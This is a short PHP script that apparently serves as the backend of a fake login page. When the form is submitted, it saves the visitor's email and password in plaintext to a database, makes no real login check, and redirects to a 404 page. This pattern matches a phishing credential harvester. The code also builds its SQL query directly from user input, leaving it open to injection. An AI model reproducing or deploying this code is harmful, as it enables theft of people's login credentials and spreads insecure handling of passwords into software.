<?php

include_once("config.php");

if (isset($_POST['masuk'])) {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    mysqli_query($mysqli, "INSERT INTO user(email,password) VALUES ('$email','$password')");

    header('location: 404');
}
